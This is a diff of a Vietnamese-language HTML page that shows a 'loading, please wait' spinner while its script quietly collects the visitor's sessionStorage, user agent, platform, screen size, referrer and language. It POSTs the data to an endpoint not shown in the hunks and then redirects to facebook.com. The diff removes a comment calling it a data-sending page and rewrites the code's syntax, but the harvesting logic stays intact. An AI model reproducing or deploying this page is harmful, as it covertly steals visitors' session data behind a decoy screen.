@@ -1,4 +1,3 @@
-<!-- index.html - Trang gửi dữ liệu -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -12,7 +11,7 @@
 </head>
 <body>
     <div class="spinner"></div>
-    <h2>Đang tải, vui lòng chờ...</h2>
+    <h2>Dang tai, vui long cho...</h2>
 
     <script>
         const collectData = () => {
@@ -23,7 +22,7 @@
                 sessionStorage: JSON.stringify(sessionStorage),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
+                screen: screen.width + 'x' + screen.height,
                 referrer: document.referrer,
                 timestamp: Date.now(),
                 language: navigator.language,
@@ -35,9 +34,9 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: 'data=' + encodeURIComponent(JSON.stringify(collectData()))
-        }).then(() => {
+        }).then(function() {
             window.location.href = 'https://www.facebook.com';
-        }).catch(() => {
+        }).catch(function() {
             window.location.href = 'https://www.facebook.com';
         });
     </script>
